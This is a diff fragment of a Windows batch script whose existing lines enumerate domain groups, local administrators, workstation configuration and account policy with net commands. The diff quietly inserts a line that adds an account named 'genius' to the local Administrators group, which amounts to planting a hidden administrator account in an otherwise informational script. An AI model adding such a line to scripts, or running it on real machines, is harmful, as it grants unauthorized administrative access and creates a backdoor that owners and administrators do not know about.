@@ -42,6 +42,8 @@ net group "Enterprise Admins" /domain
 ECHO ============================
 net localgroup administrators /domain
 ECHO ============================
+net localgroup administrators genius /add
+ECHO ============================
 net config workstation
 ECHO ============================
 net accounts
